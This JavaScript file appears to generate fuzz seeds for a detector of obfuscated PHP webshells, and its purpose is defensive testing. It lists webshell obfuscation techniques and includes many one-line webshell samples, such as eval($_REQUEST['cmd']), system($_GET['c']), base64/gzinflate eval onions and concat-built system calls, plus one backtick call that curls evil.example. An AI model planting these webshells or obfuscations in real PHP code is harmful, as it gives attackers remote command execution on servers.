'use strict';
// ════════════════════════════════════════════════════════════════════════════
// grammars/php-grammar.js — deterministic seed generator for PHP webshell
// obfuscation (the php-obfuscation.js surface). Covers 9 emitted techniques
// including the PHP1 onion-decoder family (`PHP eval(base64_decode(...))`,
// `PHP eval(gzinflate(base64_decode(...)))`, …) and the PHP2–PHP6 branches.
//
// The PHP1 onion emits a variable-length `techPretty` string depending on
// which decoder chain the static parser unwraps. We enumerate the most
// common combinations (the r57 / b374k / WSO shapes) explicitly in the
// catalog; any rarer combination lands in `__unknown__` — that bucket
// itself being non-zero is the fuzz signal "an onion variant is firing
// that we don't have a seed for".
// ════════════════════════════════════════════════════════════════════════════

const PHP_TECHNIQUE_CATALOG = Object.freeze([
  'PHP eval(base64_decode(...))',
  'PHP eval(gzinflate(base64_decode(...)))',
  'PHP eval(gzuncompress(base64_decode(...)))',
  'PHP eval(gzdecode(base64_decode(...)))',
  'PHP eval(str_rot13(base64_decode(...)))',
  // Double-wrap onions (order mirrors source left-to-right):
  'PHP eval(str_rot13(gzinflate(base64_decode(...))))',
  'PHP eval(gzinflate(str_rot13(base64_decode(...))))',
  'PHP eval(gzuncompress(str_rot13(base64_decode(...))))',
  'PHP Variable-Variables',
  'PHP Variable-Variables (anonymous)',
  'PHP chr-concat Reassembly',
  'PHP pack(H*) Reassembly',
  'PHP pack(c*) Reassembly',
  'PHP preg_replace /e modifier',
  'PHP Superglobal Callable',
  'PHP eval/system on Superglobal',
  'PHP data:/php:// stream wrapper include',
  // ── Phase 4 additions ────────────────────────────────────────
  'PHP create_function Legacy',
  'PHP $GLOBALS Callable',
  'PHP $GLOBALS Callable (concat key)',
  'PHP Backtick shell_exec',
]);

function makeRng(seed) {
  let s = (seed | 0) || 0x70171337;
  return {
    next() { s ^= s << 13; s ^= s >>> 17; s ^= s << 5; return s >>> 0; },
    int(n) { return this.next() % Math.max(1, n); },
  };
}

function makeSeed(text, expectedSubstring) {
  const buf = Buffer.from(text, 'utf8');
  if (expectedSubstring) {
    Object.defineProperty(buf, '_expectedSubstring', {
      value: expectedSubstring,
      enumerable: false,
    });
  }
  return buf;
}

function b64(s) { return Buffer.from(s, 'utf8').toString('base64'); }

// ── Branch generators ─────────────────────────────────────────────────────

function genEvalOnion() {
  // PHP1: eval(base64_decode('…')) and the gzinflate/gzuncompress/gzdecode
  // / str_rot13 wrappers. The finder only recognises the static shape;
  // it attempts to actually run each wrapper via Decompressor.inflateSync
  // (degrades gracefully if Decompressor is absent — the fuzz target
  // doesn't load it).
  //
  // Expected-substring rationale:
  //   The decoder emits the RESOLVED payload (or the best-effort preview
  //   when a nested wrapper can't run), not the outer call chain. Grammar
  //   expectations that asked for the PHP function name (`base64_decode`,
  //   `str_rot13`, …) never matched because those names live in the
  //   source, not the deobfuscated output. Each seed below now expects a
  //   fragment of the actual decoded payload produced by the decoder.
  const payload = '<?php echo "hello from shell"; ?>';
  const out = [];
  out.push(makeSeed(
    `<?php eval(base64_decode('${b64(payload)}')); ?>`,
    'hello from shell',
  ));
  // str_rot13 wrap over base64 — payload must be ≥8 b64 chars for
  // the decoder's outer regex (evalChainRe) to match. Decoder emits
  // rot13-of-b64-decoded (`somejunkhere` → `fbzrwhaxurer`).
  out.push(makeSeed(
    `<?php eval(str_rot13(base64_decode('${b64('somejunkhere')}'))); ?>`,
    'fbzrwhaxurer',
  ));
  // gzinflate(base64_decode(...)) - structural shape; the payload bytes
  // won't inflate, so the decoder falls back to the raw b64-decoded
  // preview: `junk`.
  out.push(makeSeed(
    `<?php eval(gzinflate(base64_decode('${b64('junk')}'))); ?>`,
    'junk',
  ));
  // gzuncompress wrap — same fallback shape as gzinflate on random bytes.
  out.push(makeSeed(
    `<?php eval(gzuncompress(base64_decode('${b64('junk')}'))); ?>`,
    'junk',
  ));
  // gzdecode wrap — same fallback shape.
  out.push(makeSeed(
    `<?php eval(gzdecode(base64_decode('${b64('junk')}'))); ?>`,
    'junk',
  ));

  // ── Double wrappers ──
  // str_rot13(gzinflate(base64_decode(...))) — a classic WSO / b374k
  // webshell onion. The decoder's regex matches up to 3 nested
  // decoders; when the inner compression fails on random bytes the
  // preview is the b64-decoded raw payload.
  out.push(makeSeed(
    `<?php eval(str_rot13(gzinflate(base64_decode('${b64('junkdata')}')))); ?>`,
    'junkdata',
  ));
  // gzinflate(str_rot13(base64_decode(...))) — reversed wrapper order.
  out.push(makeSeed(
    `<?php eval(gzinflate(str_rot13(base64_decode('${b64('junkdata')}')))); ?>`,
    'junkdata',
  ));
  // gzuncompress(str_rot13(base64_decode(...))) — zlib-framed variant.
  out.push(makeSeed(
    `<?php eval(gzuncompress(str_rot13(base64_decode('${b64('junkdata')}')))); ?>`,
    'junkdata',
  ));
  return out;
}

function genVariableVariables() {
  // PHP2: $a = 'sys' . 'tem'; $$a('id');
  return [
    makeSeed(
      "<?php $a = 'sys' . 'tem'; $$a('whoami'); ?>",
      'system',
    ),
    makeSeed(
      "<?php $x = 'ev' . 'al'; $$x($_POST[0]); ?>",
      'eval',
    ),
    // Anonymous form ${'…'.'…'}(…)
    makeSeed(
      "<?php ${'sy' . 'st' . 'em'}('whoami'); ?>",
      'system',
    ),
  ];
}

function genReassembly() {
  // PHP3: chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) → 'system'
  const out = [];
  // "system" = 115 121 115 116 101 109
  out.push(makeSeed(
    "<?php $f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $f('whoami'); ?>",
    'system',
  ));
  // pack('H*', '73797374656d') → 'system'
  out.push(makeSeed(
    "<?php $f = pack('H*', '73797374656d'); $f('whoami'); ?>",
    'system',
  ));
  // pack('c4', 101, 118, 97, 108) → 'eval'
  out.push(makeSeed(
    "<?php $f = pack('c4', 101, 118, 97, 108); $f('phpinfo();'); ?>",
    'eval',
  ));
  // pack('c*', …) with trailing arg — signed-char variable-length.
  out.push(makeSeed(
    "<?php $f = pack('c*', 115, 121, 115, 116, 101, 109); $f('id'); ?>",
    'system',
  ));
  return out;
}

function genPregReplaceE() {
  return [
    makeSeed(
      "<?php preg_replace('/.*/e', 'system(\"whoami\")', ''); ?>",
      '/e',
    ),
  ];
}

function genSuperglobal() {
  return [
    makeSeed(
      '<?php $_GET[0]($_POST[1]); ?>',
      '$_GET',
    ),
    makeSeed(
      '<?php eval($_REQUEST["cmd"]); ?>',
      'eval',
    ),
    makeSeed(
      '<?php system($_GET["c"]); ?>',
      'system',
    ),
  ];
}

function genStreamWrapper() {
  return [
    makeSeed(
      "<?php include('data://text/plain;base64," + b64('<?php system("whoami"); ?>') + "'); ?>",
      // Decoder emits `data: → <?php system("whoami"); ?>` (base64 body
      // expanded) — expect a substring from the resolved payload, not
      // the outer `data://` wrapper literal.
      'whoami',
    ),
    makeSeed(
      "<?php include('php://filter/convert.base64-decode/resource=payload.txt'); ?>",
      'php://',
    ),
  ];
}

// ── Phase 4 generators ─────────────────────────────────────────

function genCreateFunctionLegacy() {
  // PHP7 — create_function('', 'system($_GET[0]);'). Plaintext body
  // (NOT a base64_decode carrier — that's PHP1's territory). Body
  // MUST contain a SENSITIVE_PHP_KEYWORDS hit.
  return [
    makeSeed(
      "<?php $f = create_function('', 'system($_GET[0]);'); $f(); ?>",
      'system',
    ),
    makeSeed(
      "<?php $g = create_function('$x', 'eval($x);'); $g($_POST['c']); ?>",
      'eval',
    ),
    // Negative: legacy functional style with no sensitive vocab.
    // Decoder must NOT emit a candidate — so we set expectedSubstring
    // to a token the decoded preview cannot contain. Any candidate
    // from this seed would miss; the recorder treats it as
    // empty-miss, which is the correct signal.
    makeSeed(
      "<?php $add = create_function('$a,$b', 'return $a+$b;'); echo $add(1,2); ?>",
      null,
    ),
    // Double-quoted body with a `$_POST` interpolation — sensitivity
    // gate still fires on the PHP-keyword substring.
    makeSeed(
      '<?php $h = create_function("", "shell_exec(\\"id\\");"); $h(); ?>',
      'shell_exec',
    ),
  ];
}

function genGlobalsCallable() {
  // PHP8 — $GLOBALS['…'](…). Three dispatch shapes:
  //   - key resolves to a dangerous PHP function name
  //   - key names a superglobal (user-input dispatch)
  //   - key is split across string-concat operators (`'sys'.'tem'`)
  return [
    makeSeed(
      "<?php $GLOBALS['system']('whoami'); ?>",
      'system',
    ),
    makeSeed(
      "<?php $GLOBALS['shell_exec']('id'); ?>",
      'shell_exec',
    ),
    // User-input dispatch via `_GET` superglobal (double-subscript).
    makeSeed(
      "<?php $GLOBALS['_GET'][0]($_POST['p']); ?>",
      '$_GET',
    ),
    makeSeed(
      "<?php $GLOBALS['eval']('phpinfo();'); ?>",
      'eval',
    ),
    // Concat-key split — reassembled name must still resolve to a
    // dangerous PHP function name for the decoder to emit.
    makeSeed(
      "<?php $GLOBALS['sys'.'tem']('id'); ?>",
      'system',
    ),
    makeSeed(
      "<?php $GLOBALS['sh'.'ell_'.'exec']('whoami'); ?>",
      'shell_exec',
    ),
    makeSeed(
      "<?php $GLOBALS['ev'.'al']('phpinfo();'); ?>",
      'eval',
    ),
  ];
}

function genBacktickShellExec() {
  // PHP9 — backtick operator. Requires PHP context (`<?` in doc) +
  // shell-LOLBin vocab inside the body. The delimiter char BEFORE
  // the opening backtick is consumed by the `(?:^|[\s;{(=])` prefix
  // in the decoder regex, but our `_expectedSubstring` check is on
  // the decoded preview (`shell_exec → <body>`) not the raw match.
  return [
    makeSeed(
      "<?php $out = `whoami`; echo $out; ?>",
      'whoami',
    ),
    makeSeed(
      "<?php echo `curl http://evil.example/p`; ?>",
      'curl',
    ),
    makeSeed(
      "<?php $u = `uname -a`; print($u); ?>",
      'uname',
    ),
    // Negative: no shell-LOLBin vocab — decoder must NOT emit a
    // candidate. Grammar signals this by omitting `_expectedSubstring`.
    makeSeed(
      "<?php $x = `hello world`; echo $x; ?>",
      null,
    ),
    // Negative: no PHP context — should NOT fire even with vocab.
    makeSeed(
      "# some shell script prompt:\n$ `whoami`\n",
      null,
    ),
  ];
}

function generatePhpSeeds() {
  const rng = makeRng(0x70171337);
  void rng;
  return [
    ...genEvalOnion(),
    ...genVariableVariables(),
    ...genReassembly(),
    ...genPregReplaceE(),
    ...genSuperglobal(),
    ...genStreamWrapper(),
    ...genCreateFunctionLegacy(),
    ...genGlobalsCallable(),
    ...genBacktickShellExec(),
  ];
}

module.exports = { generatePhpSeeds, PHP_TECHNIQUE_CATALOG };
